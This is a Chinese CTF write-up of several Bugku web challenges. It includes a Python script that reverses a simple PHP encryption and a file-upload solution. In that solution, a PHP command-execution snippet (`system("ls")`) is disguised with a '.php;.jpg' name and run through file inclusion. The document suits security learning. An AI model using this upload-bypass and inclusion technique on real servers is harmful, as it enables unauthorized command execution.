web部分的37-50题

# PHP_encrypt_1(ISCCCTF)

题目给了一段密文：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=

还有一个压缩包，解压后发现了下面的php代码

```php
<?php
function encrypt($data,$key)
{
    $key = md5('ISCC');
    $x = 0;
    $len = strlen($data);
    $klen = strlen($key);
    for ($i=0; $i < $len; $i++) { 
        if ($x == $klen)
        {
            $x = 0;
        }
        $char .= $key[$x];
        $x+=1;
    }
    for ($i=0; $i < $len; $i++) {
        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
    }
    return base64_encode($str);
}
?>
```

写出相应的脚本如下，运行下面的解密代码即可得到flag

```python
import base64
import hashlib


def decrypt(b64):
    b64 = str(base64.b64decode(b64), encoding='utf8')  # base64转换后是byte类型数据
    key = 'ISCC'
    m = hashlib.md5()
    m.update(key.encode())
    md = m.hexdigest()
    b64_len = len(b64)
    x = 0
    char = ''
    for i in range(b64_len):  # strlen($str)==strlen($char)==strlen($data)
        if x == len(md):
            x = 0
        char += md[x]
        x += 1
    data = ''
    # 也可不进行正负判断：data += chr((ord(b64[i]) - ord(char[i])+128) % 128)
    for i in range(b64_len):
        d = ord(b64[i]) - ord(char[i])
        if d > 0:  # 进行判断，如果相减小于0，说明需要加上128
            data += chr(d)
        else:
            data += chr(d + 128)
    print(data)


if __name__ == "__main__":
    b64 = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='
    decrypt(b64)

```

# 文件包含2

查看源码，发现注释中有 upload.php 的提示，于是打开 http://123.206.31.85:49166/upload.php，发现是文件上传。

在php文件里写入 `<script language=php>system("ls")</script>` ，列当前目录，修改后缀名为jpg,如1.php;.jpg,上传成功，如下图所示：

![文件包含2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.png)

访问 http://123.206.31.85:49166/index.php?file=upload/201911191206089664.jpg，提示我们：about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php。

然后访问 http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt，得到flag

# sql注入2

题目网站：http://123.206.87.240:8007/web2/

直接在后面加上 flag，即http://123.206.87.240:8007/web2/flag，然后下载了一个文件结果就是flag，但是不知道是什么原因，御剑没有扫出来。

# Trim的日记本

使用御剑扫描出来下面的结果，然后打开发现flag，竟然真的是flag

![Trim的日记本](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC.png)